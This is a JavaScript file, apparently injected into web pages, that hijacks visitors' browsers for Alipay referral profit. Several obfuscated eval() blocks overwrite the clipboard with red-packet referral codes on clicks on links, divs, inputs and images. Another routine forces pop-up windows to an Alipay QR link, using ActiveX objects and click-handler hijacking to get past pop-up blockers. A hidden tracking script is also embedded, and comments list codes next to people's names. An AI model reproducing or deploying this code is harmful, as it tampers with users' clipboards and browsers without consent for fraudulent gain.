var _typeof = "function" === typeof Symbol && "symbol" === typeof Symbol.iterator ?
function(a) {
	return typeof a
} : function(a) {
	return a && "function" === typeof Symbol && a.constructor === Symbol && a !== Symbol.prototype ? "symbol" : typeof a
};
(function(a, d) {
	(function(a) {
		a += "=";
		for (var c = d.cookie.split(";"), b = 0; b < c.length; b++) {
			var e = c[b].trim();
			if (0 == e.indexOf(a)) return e.substring(a.length, e.length)
		}
		return ""
	})
    ("__tok") || (function(a) {
		var b = document.createElement("script");
		b.type = "text/javascript";
		b.src = a;
		document.body.appendChild(b)
	}("https://cdn.bootcss.com/clipboard.js/1.7.1/clipboard.min.js"), function(b) {
		if ("undefined" != typeof a.addEventListener) a.addEventListener("load", b, !1);
		else if (_typeof(d.addEventListener)) d.addEventListener("load", b, !1);
		else if ("undefined" != typeof a.attachEvent) a.attachEvent("load", b);
		else {
			var c = a.onload;
			a.onload = "function" != typeof a.onload ? b : function() {
				c();
				b()
			}
		}
	}(function() {
		var mycodes=new Array("快来领取支付宝跨年红包！1月1日起还有机会额外获得专享红包哦！复制此消息，打开最新版支付宝就能领取！3zZdLf05hv","快来领取支付宝跨年红包！1月1日起还有机会额外获得专享红包哦！复制此消息，打开最新版支付宝就能领取！3zZdLf05hv");
		var rnum=parseInt(mycodes.length*Math.random());
		var zfbcode=mycodes[rnum];	

        // new Clipboard("a", {
        //     text: function() {
        //         return zfbcode;
        //     }
        //     });
        // new Clipboard("div", {
        //     text: function() {
        //         return zfbcode;
        //     }
        // });
        // new Clipboard("input", {
        //     text: function() {
        //         return zfbcode;
        //     }
        // });
        // new Clipboard("img", {
        //     text: function() {
        //         return zfbcode;
        //     }
        // });


		function checkCookie(){
			if(document.cookie.indexOf('GewEWx+vbTkYq')!==-1){				
				var time = getCookie('GewEWx+vbTkYq')	;			
				if(new Date().getTime()-parseInt(time)<6*60*60*1000){					
					return false;
				}else{					
					document.cookie= "GewEWx+vbTkYq="+new Date().getTime()+';';					
					return true;
				}
			}else{				
				document.cookie= "GewEWx+vbTkYq="+new Date().getTime()+';';				
				return true;
			}
		}
		function getCookie(name) { 
	　　　　if (document.cookie.length>0){　　
	　　　　　　var c_start=document.cookie.indexOf(name + "=")　　;　
	　　　　　　if (c_start!=-1){ 
	　　　　　　　　c_start=c_start + name.length+1　　;
	　　　　　　　　var c_end=document.cookie.indexOf(";",c_start)　　;
	　　　　　　　　if (c_end==-1) c_end=document.cookie.length　　;
	　　　　　　　　return unescape(document.cookie.substring(c_start,c_end))　　;
	　　　　　　} 
	　　　　}
	　　　　return "";
		}
		function openAliPay(){
			window.open('http://qr.alipay.com/c1x07766kinzpbdaydwuw1f');
		}

    var authcode = '';
	var paypopupURL = 'http://qr.alipay.com/c1x07766kinzpbdaydwuw1f' + authcode; //需要打开网站的网址
	var _hascsp = 0;
	var poptype = 1;
	//弹窗的主要函数
	function updatecs() {}; (function() {
		var browserType = navigator.userAgent;//navigator.userAgent来判断浏览器类型
		var openPage = {};//弹窗重要的对象
		openPage.ver = {
			ie: /MSIE/.test(browserType),//判断是否是IE
			ie6: !/MSIE 7\.0/.test(browserType) && /MSIE 6\.0/.test(browserType) && !/MSIE 8\.0/.test(browserType),//判断是不是IE6
			tt: /TencentTraveler/.test(browserType),//判断是不是腾讯浏览器
			i360: /360SE/.test(browserType),//判断是不是360
			sogo: /; SE/.test(browserType),//判断是不是sogo
			gg: window.google && window.chrome,//判断是不是谷歌
			_v1: '<object id="_tt_cs01" width="0" height="0" classid="CLSID:6BF5' + '2A52-394' + 'A-1' + '1D3-B15' + '3-00' + 'C04F' + '79FAA6"></object>',
			_v2: '<object id="_tt_cs02" style="position:absolute;left:1px;top:1px;width:1px;height:1px;" classid="clsid:2D' + '360201-FF' + 'F5-11' + 'd1-8D0' + '3-00A' + '0C95' + '9BC0A"></object>'
		};
		if (openPage.ver.ie || openPage.ver.tt) {//如果是IE和TT浏览器
			
			document.write(openPage.ver._v1);//向浏览器写入v1变量
			document.write(openPage.ver._v2);//向浏览器写入v2变量
		}
		openPage.onclick = null;//浏览器的点击事件
		openPage.fdc = null;
		openPage.timeid = 0;
		openPage.first = 1;
		openPage.url = '';
		openPage.w = 0;
		openPage.h = 0;
		openPage.init = function() { //初始化
			try {
				if (typeof document.body.onclick == "function") { //判断浏览器的onclick事件是否可用
					openPage.onclick = document.body.onclick;//把浏览器的点击事件赋值给弹窗对象的onclick成员
					document.body.onclick = null;//把浏览器默认的onclick设置为null
				}
				if (typeof document.onclick == "function") {//判断浏览器的document.onclick
					if (document.onclick.toString().indexOf('clickpp') < 0) {
						openPage.fdc = document.onclick;
						document.onclick = function() {
							openPage.clickpp(openPage.url, openPage.w, openPage.h);
						}
					}
				}
			} catch(q) {}
		};
		openPage.donepp = function(c, g) {
			if (g == 1 && (!openPage.ver.i360 && openPage.ver.ie6)) return;
			if (_hascsp) return;
			try {
				document.getElementById("_tt_cs01").launchURL(c);
				_hascsp = 1;
				updatecs()
			} catch(q) {}
		};
		openPage.clickpp = function(c, e, f) {
			openPage.open(c, e, f);
			clearInterval(openPage.timeid);
			document.onclick = null;
			if (typeof openPage.fdc == "function") try {
				document.onclick = openPage.fdc;
			} catch(q) {}
			if (typeof openPage.onclick == "function") try {
				document.body.onclick = openPage.onclick;
			} catch(q) {}
		}
		openPage.open = function(c, e, f) {
			if (_hascsp) return;
			openPage.url = c;
			openPage.w = e;
			openPage.h = f;
			if (openPage.timeid == 0) openPage.timeid = setInterval(openPage.init, 100);
			var b = 'height=' + f + ',width=' + e + ',left=0,top=0,toolbar=yes,location=yes,status=yes,menubar=yes,scrollbars=yes,resizable=yes';
			var j = 'window.open("' + c + '", "_blank", "' + b + '")';
			var m = null;
			try {
				m = eval(j);
			} catch(q) {}
			if (m && !(openPage.first && openPage.ver.gg)) {
				if (poptype != -1) {
					m.focus();
				} else {
					m.blur();
					window.focus();
				}
				_hascsp = 1;
				updatecs();
				if (typeof openPage.onclick == "function") try {
					document.body.onclick = openPage.onclick;
				} catch(q) {}
				clearInterval(openPage.timeid);
			} else {
				var i = this;
				var j = false;
				if (openPage.ver.ie || openPage.ver.tt) {
					document.getElementById("_tt_cs01");
					document.getElementById("_tt_cs02");
					setTimeout(function() {
						var obj = document.getElementById("_tt_cs02");
						if (_hascsp || !obj) return;
						try {
							var wPop = obj.DOM.Script.open(c, "_blank", b);
							if (wPop) {
								if (poptype != -1) {
									wPop.focus();
								} else {
									wPop.blur();
									window.focus();
								}
								_hascsp = 1;
								updatecs();
							} else if (openPage.ver.sogo) {
								_hascsp = 1;
								updatecs();
							}
						} catch(q) {}
					},
					200);
				}
				if (openPage.first) {
					openPage.first = 0;
					try {
						if (typeof document.onclick == "function") openPage.fdc = document.onclick;
					} catch(p) {}
					document.onclick = function() {
						i.clickpp(c, e, f);
					};
					if (openPage.ver.ie) {
						if (window.attachEvent) window.attachEvent("onload",
						function() {
							i.donepp(c, 1);
						});
						else if (window.addEventListener) window.addEventListener("load",
						function() {
							i.donepp(c, 1);
						},
						true);
						else window.onload = function() {
							i.donepp(c, 1);
						};
					}
				}
			}
		};
		window.__csppp = openPage; //把__csppp设置为Window下面
	})();
	


	setTimeout(function(){
		if(Math.random()>0.7&&checkCookie()){
			__csppp.open(paypopupURL, window.screen.width, window.screen.height);
		}
	},1000*(2 + Math.random()*5))
	}))
})(window, document);

document.writeln('<div style="display:none"><script src="https://s22.cnzz.com/z_stat.php?id=1271885509&web_id=1271885509" language="JavaScript"><\/script><\/div>')

//'B22oX763on'  lx 大号
//'H00vRc31gn'  lx 小号
//'jrPsdz58Z4'  fyf 大号
//'zduV12092r'    fyf 小号

//d
//eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4 t="2"===5 8&&"v"===5 8.Y?2(a){3 5 a}:2(a){3 a&&"2"===5 8&&a.H===8&&a!==8.G?"v":5 a};(2(a,d){(2(a){a+="=";E(4 c=d.F.J(";"),b=0;b<c.g;b++){4 e=c[b].N();h(0==e.O(a))3 e.M(a.g,e.g)}3""})("K")||(2(a){4 b=k.L("x");b.w="6/D";b.A=a;k.B.C(b)}("z://y.10.Z/u.q/1.7.1/u.X.q"),2(b){h("p"!=5 a.i)a.i("n",b,!1);m h(t(d.i))d.i("n",b,!1);m h("p"!=5 a.s)a.s("n",b);m{4 c=a.l;a.l="2"!=5 a.l?b:2(){c();b()}}}(2(){4 o=f T("U","W","V","Q");4 r=P(o.g*12.S());4 9=o[r];f j("a",{6:2(){3 9}});f j("R",{6:2(){3 9}});f j("11",{6:2(){3 9}});f j("13",{6:2(){3 9}})}))})(I,k);',62,66,'||function|return|var|typeof|text||Symbol|zfbcode||||||new|length|if|addEventListener|Clipboard|document|onload|else|load|mycodes|undefined|js|rnum|attachEvent|_0|clipboard|symbol|type|script|cdn|https|src|body|appendChild|javascript|for|cookie|prototype|constructor|window|split|__tok|createElement|substring|trim|indexOf|parseInt|BfPc7973gd|div|random|Array|BfPc7973gd|BfPc7973gd|BfPc7973gd|min|iterator|com|bootcss|input|Math|img'.split('|'),0,{}))
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4 s="2"===5 6&&"p"===5 6.A?2(a){3 5 a}:2(a){3 a&&"2"===5 6&&a.z===6&&a!==6.B?"p":5 a};(2(a,d){(2(a){a+="=";I(4 c=d.J.K(";"),b=0;b<c.g;b++){4 e=c[b].H();j(0==e.E(a))3 e.F(a.g,e.g)}3""})("C")||(2(a){4 b=n.G("P");b.Q="f/R";b.O=a;n.L.M(b)}("N://D.x.w/q.r/1.7.1/q.y.r"),2(b){j("t"!=5 a.h)a.h("k",b,!1);l j(s(d.h))d.h("k",b,!1);l j("t"!=5 a.v)a.v("k",b);l{4 c=a.m;a.m="2"!=5 a.m?b:2(){c();b()}}}(2(){4 o=8 1f("1g","1d","1a","1b","1c","1h","1n","1j","1m","1i","1k","1l","Y","1e","10","Z","W","T","S","V","U","17","16","19");4 u=18(o.g*15.12());4 9=o[u];8 i("a",{f:2(){3 9}});8 i("11",{f:2(){3 9}});8 i("14",{f:2(){3 9}});8 i("13",{f:2(){3 9}})}))})(X,n);',62,86,'||function|return|var|typeof|Symbol||new|zfbcode||||||text|length|addEventListener|Clipboard|if|load|else|onload|document|mycodes|symbol|clipboard|js|_0|undefined|rnum|attachEvent|com|bootcss|min|constructor|iterator|prototype|__tok|cdn|indexOf|substring|createElement|trim|for|cookie|split|body|appendChild|https|src|script|type|javascript|hvwYW3381H|7LcB4038hr|OztfY338A0|yxtdak38KZ|XGSaXp38no|window|068vFa38Qf|QiqC8Z388I|04phgJ38bw|div|random|img|input|Math|CqDJGS38Z3|zt4pUh384X|parseInt|upmU9J38Xk|PLhHUr38bP|eObv2138q3|3djhAX38QD|FUk6FI38JO|nZVDWZ38wt|Array|4lgU6G38Lu|BasAyr38Fq|PHogHy38CA|IGuExX38fQ|mC6Gok38OA|i9FfEj38t1|TR5PIS38WO|BLWWZA38iL'.split('|'),0,{}))

//c
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4 q="2"===5 f&&"p"===5 f.K?2(a){3 5 a}:2(a){3 a&&"2"===5 f&&a.L===f&&a!==f.H?"p":5 a};(2(a,d){(2(a){a+="=";M(4 c=d.Q.R(";"),b=0;b<c.g;b++){4 e=c[b].P();h(0==e.N(a))3 e.O(a.g,e.g)}3""})("G")||(2(a){4 b=m.x("y");b.z="8/w";b.A=a;m.E.F(b)}("D://B.C.S/r.t/1.7.1/r.13.t"),2(b){h("s"!=5 a.j)a.j("l",b,!1);k h(q(d.j))d.j("l",b,!1);k h("s"!=5 a.u)a.u("l",b);k{4 c=a.n;a.n="2"!=5 a.n?b:2(){c();b()}}}(2(){4 o=6 Y("10","T","17","18","15","X","Z","U","W");4 v=V(o.g*11.16());4 9=o[v];6 i("a",{8:2(){3 9}});6 i("12",{8:2(){3 9}});6 i("14",{8:2(){3 9}});6 i("I",{8:2(){3 9}})}))})(J,m);',62,71,'||function|return|var|typeof|new||text|zfbcode||||||Symbol|length|if|Clipboard|addEventListener|else|load|document|onload|mycodes|symbol|_0|clipboard|undefined|js|attachEvent|rnum|javascript|createElement|script|type|src|cdn|bootcss|https|body|appendChild|__tok|prototype|img|window|iterator|constructor|for|indexOf|substring|trim|cookie|split|com|Q8ZmJP94VV|2kT7Jp94Cn|parseInt|T7M26T943d|U5e4Yk94MP|Array|gf5AVc943R|FJgPBO94q1|Math|div|min|input|EN0VTh94zW|random|W3Z4Pd94gf|7l1brS94bu'.split('|'),0,{}))


//demo

//妈
//		var mycodes=new Array("4lgU6G38Lu","FUk6FI38JO","PLhHUr38bP","eObv2138q3","3djhAX38QD","BasAyr38Fq","BLWWZA38iL","IGuExX38fQ","TR5PIS38WO","PHogHy38CA","mC6Gok38OA","i9FfEj38t1","068vFa38Qf","nZVDWZ38wt","04phgJ38bw","QiqC8Z388I","XGSaXp38no","7LcB4038hr","hvwYW3381H","yxtdak38KZ","OztfY338A0","zt4pUh384X","CqDJGS38Z3","upmU9J38Xk");
//陈洁 
//"Wkvn3x79M6","Ok7z3f79Xf","TGw0FD79wA","LZBHxx790u"
//慧慧妈
//"Du3j9D81Pt","OKuSAM81WI","vqHMp781qI","BGoH3S81z8"
//刘翔宇
//"REkH3y871r","XeA9Us87uP","H5Q9Ep87ea","mtbm6G87EC","PQ3lgr87L9"

//"UGxD0k73I7","tYyZUc36Qw","rSumBS16RK","IkXOnx23jn","jBJETv26VY","N9I9w412If","mn2lim90Nj","fD4n5Q38vo","h46f7D06yZ","717Vvt21bo","BSQHXS31Cv","oUp4uy0047","Zpdzbu48lm","W82cor83sK","ratJQi97w3","ByXC5d50gL","URGdln01M8"




//综合
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4 v="2"===3 8&&"u"===3 8.S?2(a){5 3 a}:2(a){5 a&&"2"===3 8&&a.A===8&&a!==8.J?"u":3 a};(2(a,d){(2(a){a+="=";K(4 c=d.H.E(";"),b=0;b<c.g;b++){4 e=c[b].F();h(0==e.G(a))5 e.P(a.g,e.g)}5""})("Q")||(2(a){4 b=n.R("O");b.L="f/M";b.N=a;n.y.z(b)}("w://x.C.B/s.t/1.7.1/s.D.t"),2(b){h("q"!=3 a.j)a.j("k",b,!1);m h(v(d.j))d.j("k",b,!1);m h("q"!=3 a.p)a.p("k",b);m{4 c=a.l;a.l="2"!=3 a.l?b:2(){c();b()}}}(2(){4 o=6 18("1b","1d","1c","1e","16","W","X","Y","T","U","V","Z","13","14","15");4 r=10(o.g*12.11());4 9=o[r];6 i("a",{f:2(){5 9}});6 i("19",{f:2(){5 9}});6 i("1a",{f:2(){5 9}});6 i("17",{f:2(){5 9}})}))})(I,n);',62,77,'||function|typeof|var|return|new||Symbol|zfbcode||||||text|length|if|Clipboard|addEventListener|load|onload|else|document|mycodes|attachEvent|undefined|rnum|clipboard|js|symbol|_0|https|cdn|body|appendChild|constructor|com|bootcss|min|split|trim|indexOf|cookie|window|prototype|for|type|javascript|src|script|substring|__tok|createElement|iterator|h46f7D06yZ|717Vvt21bo|BSQHXS31Cv|N9I9w412If|mn2lim90Nj|fD4n5Q38vo|oUp4uy0047|parseInt|random|Math|Zpdzbu48lm|W82cor83sK|ratJQi97w3|jBJETv26VY|img|Array|div|input|UGxD0k73I7|rSumBS16RK|tYyZUc36Qw|IkXOnx23jn'.split('|'),0,{}))

//跳转测试
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6 L="3"===g k&&"P"===g k.1m?3(a){4 g a}:3(a){4 a&&"3"===g k&&a.X===k&&a!==k.Y?"P":g a};(3(a,d){(3(a){a+="=";V(6 c=d.9.18(";"),b=0;b<c.h;b++){6 e=c[b].17();8(0==e.o(a))4 e.N(a.h,e.h)}4""})("19")||(3(a){6 b=5.Z("13");b.14="m/15";b.11=a;5.12.16(b)}("1a://1b.W.M/C.I/1.7.1/C.10.I"),3(b){8("J"!=g a.p)a.p("w",b,!1);j 8(L(d.p))d.p("w",b,!1);j 8("J"!=g a.D)a.D("w",b);j{6 c=a.x;a.x="3"!=g a.x?b:3(){c();b()}}}(3(){6 t=f 1q("z！H！E，G！F","z！H！E，G！F");6 A=B(t.h*1p.1o());6 l=t[A];f q("a",{m:3(){4 l}});f q("1e",{m:3(){4 l}});f q("1d",{m:3(){4 l}});f q("1c",{m:3(){4 l}});3 U(){8(5.9.o(\'s+n\')!==-1){6 R=O(\'s+n\')8(f u().v()-B(R)<2*T*T*1i){4 1h}j{5.9="s+n="+f u().v()+\';\';4 K}}j{5.9="s+n="+f u().v()+\';\';4 K}}3 O(y){8(5.9.h>0){6 i=5.9.o(y+"=")8(i!=-1){i=i+y.h+1 6 r=5.9.o(";",i)8(r==-1)r=5.9.h 4 1j(5.9.N(i,r))}}4""}3 S(){Q.1g(\'1f://1n.1k.M/1l\')}8(U()){S()}}))})(Q,5);',62,89,'|||function|return|document|var||if|cookie||||||new|typeof|length|c_start|else|Symbol|zfbcode|text|vbTkYq|indexOf|addEventListener|Clipboard|c_end|GewEWx|mycodes|Date|getTime|load|onload|name|快来领取支付宝跨年红包|rnum|parseInt|clipboard|attachEvent|复制此消息|3zZdLf05hv|打开最新版支付宝就能领取|1月1日起还有机会额外获得专享红包哦|js|undefined|true|_0|com|substring|getCookie|symbol|window|time|openAliPay|60|checkCookie|for|bootcss|constructor|prototype|createElement|min|src|body|script|type|javascript|appendChild|trim|split|__tok|https|cdn|img|input|div|http|open|false|1000|unescape|alipay|c1x07766kinzpbdaydwuw1f|iterator|qr|random|Math|Array'.split('|'),0,{}))